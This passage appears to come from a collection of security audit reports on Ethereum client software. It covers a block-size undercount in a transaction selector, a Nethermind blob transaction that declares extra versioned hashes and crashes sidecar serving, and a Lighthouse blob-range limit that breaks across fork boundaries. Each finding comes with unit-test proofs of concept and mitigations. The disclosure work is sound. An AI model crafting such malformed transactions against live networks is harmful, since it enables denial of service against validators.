import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import java.util.Arrays;

@ExtendWith(MockitoExtension.class)
public class BlockRlpSizeSelectorOversizeIntegrationTest {

  private static final SignatureAlgorithm SIGNATURE_ALGORITHM = SignatureAlgorithmFactory.getInstance();
  private static final KeyPair KEYS = SIGNATURE_ALGORITHM.generateKeyPair();

  @Mock(answer = RETURNS_DEEP_STUBS)
  BlockSelectionContext blockSelectionContext;

  SelectorsStateManager selectorsStateManager;

  @BeforeEach
  void setup() {
    selectorsStateManager = new SelectorsStateManager();
  }

  /**
   * Demonstrates that the selector can accept a tx set under its budget while the fully encoded
   * block (with withdrawals and list overheads) exceeds the cap and is rejected by final
   * validation.
   */
  @Test
  void selectorUndercount_leadsToOversizeBlock_rejectedByValidator() {
    // 1) Use the default (Osaka) cap from the mainnet builder
    final BlockHeaderValidator headerValidator = mock(BlockHeaderValidator.class);
    final BlockBodyValidator bodyValidator = mock(BlockBodyValidator.class);
    final BlockProcessor blockProcessor = mock(BlockProcessor.class);
    final BlockValidator defaultCapValidator =
        MainnetBlockValidatorBuilder.osaka(headerValidator, bodyValidator, blockProcessor);
    final int cap = defaultCapValidator.maxRlpBlockSize();

    // The selector reads the cap from context
    when(blockSelectionContext.maxRlpBlockSize()).thenReturn(cap);

    final BlockRlpSizeTransactionSelector selector =
        new BlockRlpSizeTransactionSelector(blockSelectionContext, selectorsStateManager);

    // 2) Build enough transactions to approach the selector's budget under the default cap
    final int selectorBudget = cap - (int) MAX_HEADER_SIZE;

    final List<Transaction> txs = new ArrayList<>();
    int used = 0;
    // mostly bigger txs for speed
    int txPayloadLength = 2000;
    while (used + 512 < selectorBudget) {
      final Transaction t =
          new TransactionTestFixture().payload(fixedBytes(txPayloadLength)).createTransaction(KEYS);
      final int s = t.getSizeForBlockInclusion();
      if (used + s > selectorBudget) break;
      txs.add(t);
      used += s;
    }
    // a few smaller ones
    txPayloadLength = 100;
    while (used + 50 < selectorBudget) {
      final Transaction t =
              new TransactionTestFixture().payload(fixedBytes(txPayloadLength)).createTransaction(KEYS);
      final int s = t.getSizeForBlockInclusion();
      if (used + s > selectorBudget) break;
      txs.add(t);
      used += s;
    }

    // Feed through selector
    for (Transaction t : txs) {
      final PendingTransaction pt =
          PendingTransaction.newPendingTransaction(t, false, false, MAX_SCORE);
      selectorsStateManager.blockSelectionStarted();
      final var eval =
          new TransactionEvaluationContext(
              blockSelectionContext.pendingBlockHeader(), pt, null, null, null);
      assertThat(selector.evaluateTransactionPreProcessing(eval)).isEqualTo(SELECTED);
      selector.evaluateTransactionPostProcessing(eval, mock(TransactionProcessingResult.class));
    }

    // 3) Assemble a block with the accepted txs and 16 withdrawals
    final List<Withdrawal> withdrawals = buildWithdrawals(16);
    final BlockBody body = new BlockBody(txs, Collections.emptyList(), Optional.of(withdrawals));

    final BlockHeader header =
        BlockHeaderBuilder.createDefault()
            .baseFee(Wei.of(100_000_000_000L))
            .prevRandao(Bytes32.leftPad(fixedBytes(32)))
            .withdrawalsRoot(Hash.EMPTY_TRIE_HASH)
            .blobGasUsed(10_000_000L)
            .excessBlobGas(BlobGas.MAX_BLOB_GAS)
            .parentBeaconBlockRoot(Bytes32.leftPad(fixedBytes(32)))
            .extraData(fixedBytes(32))
            .gasLimit(30_000_000)
            .gasUsed(30_000_000)
            .number(1_000_000)
            .timestamp(1759295934)
            .buildBlockHeader();
    final Block block = new Block(header, body);

    // The fully encoded block must exceed the cap and be rejected
    final int fullSize = block.getSize();
    // Compute sizes by comparing full block with variants (no txs; no txs and empty withdrawals)
    final Block blockNoTxs =
        new Block(
            header,
            new BlockBody(Collections.emptyList(), Collections.emptyList(), Optional.of(withdrawals)));
    final int sizeNoTxs = blockNoTxs.getSize();
    final Block blockEmptyLists =
        new Block(
            header,
            new BlockBody(
                Collections.emptyList(), Collections.emptyList(), Optional.of(Collections.emptyList())));
    final int sizeEmptyLists = blockEmptyLists.getSize();

    final int headerPlusWithdrawalsNoTxsSize = sizeNoTxs; // header + withdrawals + ommers(empty) + envelopes
    final int withdrawalsListSize = sizeNoTxs - sizeEmptyLists; // withdrawals encoding alone
    final int txListRlpSize = fullSize - sizeNoTxs; // tx list encoding alone
    final int txListOverhead = txListRlpSize - used; // list prefix overhead beyond sum(tx sizes)
    final int selectorUndercountExcess = (int) (headerPlusWithdrawalsNoTxsSize - MAX_HEADER_SIZE);
    final int overheadNotBudgeted = selectorUndercountExcess + txListOverhead;
    final int overflowThreshold = cap - overheadNotBudgeted;
    System.out.printf(
        "[dbg] headerPlusWithdrawalsNoTxsSize=%d, withdrawalsListSize=%d, txListOverhead=%d (txListRlpSize=%d), selectorUndercountExcess=%d%n",
        headerPlusWithdrawalsNoTxsSize,
        withdrawalsListSize,
        txListOverhead,
        txListRlpSize,
        selectorUndercountExcess);
    System.out.printf(
        "[dbg] overflowThreshold=%d, used=%d, slackToThreshold=%d, selectorBudget=%d%n",
        overflowThreshold,
        used,
        (overflowThreshold - used),
        selectorBudget);
    assertThat(fullSize).isGreaterThan(cap);

    final ProtocolContext protocolContext = mock(ProtocolContext.class, RETURNS_DEEP_STUBS);
    final BlockProcessingResult result =
        defaultCapValidator.validateAndProcessBlock(
            protocolContext, block, HeaderValidationMode.DETACHED_ONLY, HeaderValidationMode.DETACHED_ONLY);

    assertThat(result.isSuccessful()).isFalse();
  }

  private static Bytes fixedBytes(final int len) {
    final byte[] arr = new byte[len];
    Arrays.fill(arr, (byte) 0x42);
    return Bytes.wrap(arr);
  }

  private static List<Withdrawal> buildWithdrawals(final int count) {
    final List<Withdrawal> ws = new ArrayList<>(count);
    for (int i = 0; i < count; i++) {
      ws.add(
          new Withdrawal(
              UInt64.valueOf(10_0000 + i),
              UInt64.valueOf(10_0000 + i),
              Address.ZERO,
              GWei.of(32_000_000_000L)));
    }
    return ws;
  }


}
```

### Mitigation

- A more conservative overhead is the simplest solution (Geth: 1MB, Nethermind: 260KB). 
- Reth calculates withdrawals size and budgets 1024 on top of that. 
- Erigon calculates the exact RLP size.

### Summary

Missing equality checks between declared `blob_versioned_hashes` and the real blob and commitment arrays will cause a runtime exception for Nethermind validators as an attacker will submit a blob transaction that declares more hashes than the number of blob data items in the wrapper.

### Root Cause

The code accepts a blob transaction when the number of declared `blob_versioned_hashes` is not equal to the number of actual blob data items and commitments in the wrapper, causes an exception when serving sidecar data.

In [TxValidator.cs:288-296](https://github.com/NethermindEth/nethermind/blob/96475712649577c80261aeec5b547daa5b2c287e/src/Nethermind/Nethermind.Consensus/Validators/TxValidator.cs#L288-L296), the validation accepts wrappers if internal lengths match and KZG checks pass, but it never checks that `tx.BlobVersionedHashes.Length` equals `wrapper.Blobs.Length` and `wrapper.Commitments.Length`:
```csharp
static ValidationResult ValidateBlobs(Transaction transaction, ShardBlobNetworkWrapper wrapper, IReleaseSpec _)
{
    IBlobProofsVerifier proofsManager = IBlobProofsManager.For(wrapper.Version);

    // @audit Missing: transaction.BlobVersionedHashes.Length == wrapper.Blobs.Length == wrapper.Commitments.Length
    return !proofsManager.ValidateLengths(wrapper) ? TxErrorMessages.InvalidBlobDataSize :
        transaction.BlobVersionedHashes is null || !proofsManager.ValidateHashes(wrapper, transaction.BlobVersionedHashes) ? TxErrorMessages.InvalidBlobHashes :
        !proofsManager.ValidateProofs(wrapper) ? TxErrorMessages.InvalidBlobProofs :
        ValidationResult.Success;
}
```

In [IBlobProofsManager.cs:44-65](https://github.com/NethermindEth/nethermind/blob/96475712649577c80261aeec5b547daa5b2c287e/src/Nethermind/Nethermind.Crypto/IBlobProofsManager.cs#L44-L65), the hash verification ignores extra hashes beyond the blob count:
```csharp
public bool ValidateHashes(ShardBlobNetworkWrapper blobs, byte[][] blobVersionedHashes)
{
    Span<byte> hash = stackalloc byte[Eip4844Constants.BytesPerBlobVersionedHash];

    // [...]

    for (int i = 0; i < blobs.Blobs.Length; i++)
    {
        // @audit Only matches the first blobs.Blobs.Length items
        if (!KzgPolynomialCommitments.TryComputeCommitmentHashV1(blobs.Commitments[i], hash) || !hash.SequenceEqual(blobVersionedHashes[i].AsSpan()))
        {
            return false;
        }
    }

    return true;
}
```

In [BlobTxDistinctSortedPool.cs:57-70](https://github.com/NethermindEth/nethermind/blob/96475712649577c80261aeec5b547daa5b2c287e/src/Nethermind/Nethermind.TxPool/Collections/BlobTxDistinctSortedPool.cs#L57-L70), the sidecar serving code indexes the wrapper arrays by the index of the matching hash without bounds checks. If `hashes > blobs`, it throws `IndexOutOfRangeException`:
```csharp
for (int indexOfBlob = 0; indexOfBlob < blobTx.BlobVersionedHashes.Length; indexOfBlob++)
{
    if (Bytes.AreEqual(blobTx.BlobVersionedHashes[indexOfBlob], requestedBlobVersionedHash)
        && blobTx.NetworkWrapper is ShardBlobNetworkWrapper wrapper)
    {
        if (wrapper is null || wrapper.Version != requiredVersion)
        {
            break;
        }
        blob = wrapper.Blobs[indexOfBlob]; // @audit Can throw if hashes > blobs
        proof = proofSelector(wrapper.Proofs, indexOfBlob)! // @audit Can throw (V1)
        return true;
    }
}
```

---

This also breaks the EIP-7594 MUST rule:
> There are an equal number of `tx_payload_body.blob_versioned_hashes`, `blobs` and `commitments`.

### Internal Pre-conditions

1. Attacker submits a blob transaction in V1 network form.
2. The wrapper has 1 blob, 1 commitment, and 1 set of cell proofs (valid).
3. The transaction declares 2 `blob_versioned_hashes`. The first hash matches the commitment. The second is an extra 32-byte item with the correct version prefix.

### External Pre-conditions

None.

### Attack Path

1. Attacker broadcasts the malformed blob transaction (hashes = 2, blobs = 1).
2. Nethermind accepts it, because `ValidateHashes` ignores the extra hash.
3. When the node serves sidecar data for the declared hashes, the code indexes the wrapper arrays with the extra hash index and throws `IndexOutOfRangeException` exception.
4. The call to serve sidecar data fails, and the node cannot serve or build a block that includes this transaction until it is removed.

### Impact

The Nethermind validator cannot serve requested blob sidecars or build a payload that includes this transaction, due to a runtime exception. Given Nethermind ~38% of clients share, this meets a High severity single-transaction DoS against more than 33% of the network.

### PoC

Create new file **BlobProofMismatchDoSTest.cs** in [src/Nethermind/Nethermind.TxPool.Test](https://github.com/NethermindEth/nethermind/tree/96475712649577c80261aeec5b547daa5b2c287e/src/Nethermind/Nethermind.TxPool.Test) directory and run the test.

#### Code
```csharp
using System;
using System.Threading.Tasks;
using CkzgLib;
using Nethermind.Core;
using Nethermind.Crypto;
using Nethermind.Core.Crypto;
using Nethermind.Logging;
using Nethermind.TxPool.Collections;
using NUnit.Framework;

namespace Nethermind.TxPool.Test;

[TestFixture]
public class BlobProofMismatchDoSTest
{
    [SetUp]
    public static Task SetUp() => KzgPolynomialCommitments.InitializeAsync();

    [Test]
    public void TryGetBlobAndProofV1_throws_when_hashes_exceed_blobs()
    {
        // Prepare a single blob
        byte[] blob = new byte[Ckzg.BytesPerBlob];
        blob[0] = 1;

        // Allocate wrapper for 1 blob and compute its commitment and cell proofs (V1)
        IBlobProofsManager proofs = IBlobProofsManager.For(ProofVersion.V1);
        ShardBlobNetworkWrapper wrapper = proofs.AllocateWrapper([blob]);
        proofs.ComputeProofsAndCommitments(wrapper);

        // Compute the correct versioned hash for the single blob
        byte[][] correctHashes = proofs.ComputeHashes(wrapper);

        // Create a second, extra versioned hash
        byte[] extraHash = new byte[32];
        extraHash[0] = KzgPolynomialCommitments.KzgBlobHashVersionV1;

        // Build a blob transaction that declares 2 hashes but only has 1 blob/proofs in the wrapper
        Transaction tx = new()
        {
            Type = TxType.Blob,
            SenderAddress = Address.Zero,
            GasPrice = 1,
            DecodedMaxFeePerGas = 1,
            GasLimit = 21_000,
            MaxFeePerBlobGas = 1,
            BlobVersionedHashes = new[] { correctHashes[0], extraHash },
            NetworkWrapper = wrapper,
            Hash = Hash256.Zero,
            PoolIndex = 1,
        };

        // Validators accept the mismatch
        Assert.That(proofs.ValidateLengths(wrapper), Is.True, "Wrapper lengths must be self-consistent");
        Assert.That(proofs.ValidateProofs(wrapper), Is.True, "Wrapper proofs must validate");
        Assert.That(proofs.ValidateHashes(wrapper, tx.BlobVersionedHashes!), Is.True, "Extra trailing hashes are not rejected");

        // Insert tx into blob pool
        var pool = new BlobTxDistinctSortedPool(capacity: 8, comparer: new DummyTxComparer(), logManager: NullLogManager.Instance);
        Assert.That(pool.TryInsert(tx.Hash!, tx, out _), Is.True, "Tx must be inserted into blob pool");

        // Request the second (extra) hash; pool indexes wrapper.Blobs[1], which throws IndexOutOfRangeException
        Assert.Throws<IndexOutOfRangeException>(() =>
        {
            pool.TryGetBlobAndProofV1(tx.BlobVersionedHashes![1], out _, out _);
        }, "Requesting the extra hash triggers out-of-bounds indexing in wrapper arrays");
    }

    private sealed class DummyTxComparer : System.Collections.Generic.IComparer<Transaction>
    {
        public int Compare(Transaction x, Transaction y) => 0;
    }
}
```

### Mitigation

In `TxValidator.ValidateBlobs`, add strict equality checks:
- `transaction.BlobVersionedHashes!.Length` must equal `wrapper.Blobs.Length`
- `wrapper.Blobs.Length` must equal `wrapper.Commitments.Length`
- For V1, `wrapper.Proofs.Length` must equal `wrapper.Blobs.Length * Ckzg.CellsPerExtBlob`
- If not equal, return `InvalidBlobDataSize`.

---

```csharp
static ValidationResult ValidateBlobs(Transaction transaction, ShardBlobNetworkWrapper wrapper, IReleaseSpec _)
{
    // [...]
    if (transaction.BlobVersionedHashes is null)
        return TxErrorMessages.BlobTxMissingBlobVersionedHashes;

    int n = transaction.BlobVersionedHashes.Length;
    if (n != wrapper.Blobs.Length || n != wrapper.Commitments.Length)
        return TxErrorMessages.InvalidBlobDataSize;

    if (wrapper.Version == ProofVersion.V1 && wrapper.Proofs.Length != n * Ckzg.CellsPerExtBlob)
        return TxErrorMessages.InvalidBlobDataSize;
    // [...]
}
```

### Summary

This is a protocol-level forward-compatibility issue introduced in Deneb's `BlobSidecarsByRange` validation logic, affecting all spec-compliant consensus clients. Specifically, the spec: https://github.com/ethereum/consensus-specs/blob/v1.4.0-beta.5/specs/deneb/p2p-interface.md#blobsidecarsbyrange-v1

Deneb validates `BlobSidecarsByRange` responses by assuming `MAX_BLOBS_PER_BLOCK` is constant across the request range. When a range request crosses a fork boundary where `MAX_BLOBS_PER_BLOCK` increases (e.g., via BPO) and blocks contain many blobs, the response legitimately exceeds the requester's estimate. Nodes reject these valid responses as "too large," disconnect peers, and sync stalls—fragmenting the network.

All major clients (Lighthouse, Prysm, Teku, Nimbus, Lodestar, Grandine) enforce this rule per the spec. When fork boundaries increase blob limits under high blob usage, network-wide sync failures occur.

This report uses Lighthouse as a concrete example because all affected clients share the same root cause—the Deneb spec's assumption of constant `MAX_BLOBS_PER_BLOCK` across range requests.

### Root Cause

In https://github.com/sigp/lighthouse/blob/e5b4983d6baf85770fe4539a565d8a2dd462bc53/beacon_node/lighthouse_network/src/rpc/methods.rs#L370-L375:

```rust
impl BlobsByRangeRequest {
    pub fn max_blobs_requested(&self, epoch: Epoch, spec: &ChainSpec) -> u64 {
        let max_blobs_per_block = spec.max_blobs_per_block(epoch);
        self.count.saturating_mul(max_blobs_per_block)
    }
}
```

- `spec.max_blobs_per_block(epoch)` only inspects the quota of the epoch in which the request starts.
- The BPO blob schedule (configured via the new fork-boundary logic) allows adjacent epochs within the same fork to have different `MAX_BLOBS_PER_BLOCK` values.
- `RPCHandler::on_fully_negotiated_outbound` feeds that single-epoch estimate into `OutboundInfo::max_remaining_chunks`; each response chunk decrements this counter before reaching `BlobsByRangeRequestItems`, so any response that legitimately exceeds the estimate causes the stream to be closed and surfaces as an RPC error.


### Internal Pre-conditions

1. The node issues a `BlobsByRange` request whose slot range crosses at least one BPO boundary (routine behavior during range or historical sync).

### External Pre-conditions

N/A

### Attack Path

No external attacker is needed:
1. The node issues `BlobsByRange` for `[start_slot, start_slot + count)` that spans at least one BPO epoch boundary.
2. The peer returns `∑ᵢ count_i × max_blobs_per_block(epoch_i)` which exceeds `count × max_blobs_per_block(start_epoch)`.
3. `BlobsByRangeRequestItems` flags the response as over-limit, drops it, and disconnects the peer.
4. Repeated range-sync attempts fail; Lighthouse nodes cannot advance blob sync. With 42% of validators on Lighthouse, this would isolate 42% of the validator set from blob sync.
5. The affected validators stop producing valid attestations/proposals ⇒ the chain loses >= 1/3 of effective weight ⇒ finality halts. If finality is absent for >= 4 epochs, inactivity leak kicks in, slashing Lighthouse nodes.

### Impact

- Affected nodes would reject valid blob responses after the first BPO boundary.
- The ensuing loss of finality would trigger the inactivity leak, slashing Lighthouse validators’ balances until the network regains >= 2/3 live weight.

### PoC

Add the following unit test to the test session of https://github.com/sigp/lighthouse/blob/e5b4983d6baf85770fe4539a565d8a2dd462bc53/consensus/types/src/chain_spec.rs:

```rust
use self::blobs_by_range_compat::TestBlobsByRangeRequest;

#[cfg(test)]
mod blobs_by_range_compat {
    use super::*;

    #[derive(Debug, Clone, Copy)]
    pub struct TestBlobsByRangeRequest {
        pub start_slot: u64,
        pub count: u64,
    }

    impl TestBlobsByRangeRequest {
        /// NOTE: Copied verbatim from
        /// `lighthouse_network::rpc::methods::BlobsByRangeRequest::max_blobs_requested`.
        pub fn max_blobs_requested(&self, epoch: Epoch, spec: &ChainSpec) -> u64 {
            let max_blobs_per_block = spec.max_blobs_per_block(epoch);
            self.count.saturating_mul(max_blobs_per_block)
        }
    }
}

#[test]
fn poc_blobs_by_range_cross_epoch_cap() {
    type E = MainnetEthSpec;

    let mut spec = ChainSpec::mainnet();
    spec.electra_fork_epoch = Some(Epoch::new(5));
    spec.fulu_fork_epoch = Some(Epoch::new(6));
    spec.blob_schedule = BlobSchedule::new(vec![BlobParameters {
        epoch: Epoch::new(6),
        max_blobs_per_block: 12,
    }]);

    let slots_per_epoch = E::slots_per_epoch();
    let first_bpo_epoch = Epoch::new(6);
    let first_bpo_slot = first_bpo_epoch.start_slot(slots_per_epoch);
    let start_slot = first_bpo_slot.saturating_sub(1_u64);
    let start_slot_u64 = start_slot.as_u64();
    let count = 2_u64;
    let last_slot_u64 = start_slot_u64 + (count - 1);

    println!(
        "Configured Electra fork epoch: {:?}",
        spec.electra_fork_epoch
    );
    println!("Configured Fulu fork epoch: {:?}", spec.fulu_fork_epoch);
    println!("Blob schedule (descending epochs):");
    for entry in spec.blob_schedule.as_vec() {
        println!(
            "  epoch {} → max_blobs_per_block {}",
            entry.epoch, entry.max_blobs_per_block
        );
    }

    let start_epoch = start_slot.epoch(slots_per_epoch);
    let current = TestBlobsByRangeRequest {
        count,
        start_slot: start_slot_u64,
    }
    .max_blobs_requested(start_epoch, &spec);

    println!(
        "Request spans slots [{}..={}] across epochs {} → {}",
        start_slot_u64,
        last_slot_u64,
        start_epoch,
        Slot::new(last_slot_u64).epoch(slots_per_epoch)
    );
    println!("Current total (single-epoch assumption): {}", current);

    // Last slot in Fulu epoch (max_blobs_per_block = 9) + first slot in BPO epoch (max_blobs_per_block = 12).
    let accurate = 9 + 12;

    println!("Accurate total (Fulu last + BPO1 first): {}", accurate);

    assert_eq!(
        accurate, current,
        "intentional failure: current still uses single-epoch quota (current={} accurate={})",
        current, accurate
    );
}
